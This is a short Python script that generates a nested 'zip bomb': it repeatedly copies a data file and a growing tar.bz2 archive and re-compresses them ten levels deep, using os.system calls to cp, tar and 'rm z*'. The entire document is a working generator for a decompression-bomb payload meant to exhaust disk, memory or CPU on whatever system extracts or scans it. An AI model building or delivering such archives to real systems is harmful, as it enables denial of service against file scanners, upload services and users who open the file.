import os

os.chdir('zip_bomb')
for i in range(10):
    os.system('cp data z{}'.format(i))

os.system('tar -cjf bomb.tar.bz z*')
os.system('rm z*')
for i in range(10):
    for j in range(10):
        os.system('cp bomb.tar.bz z{}.tar.bz'.format(j))
    os.system('rm bomb.tar.bz')
    os.system('tar -cjf bomb.tar.bz z*')
    os.system('rm z*')
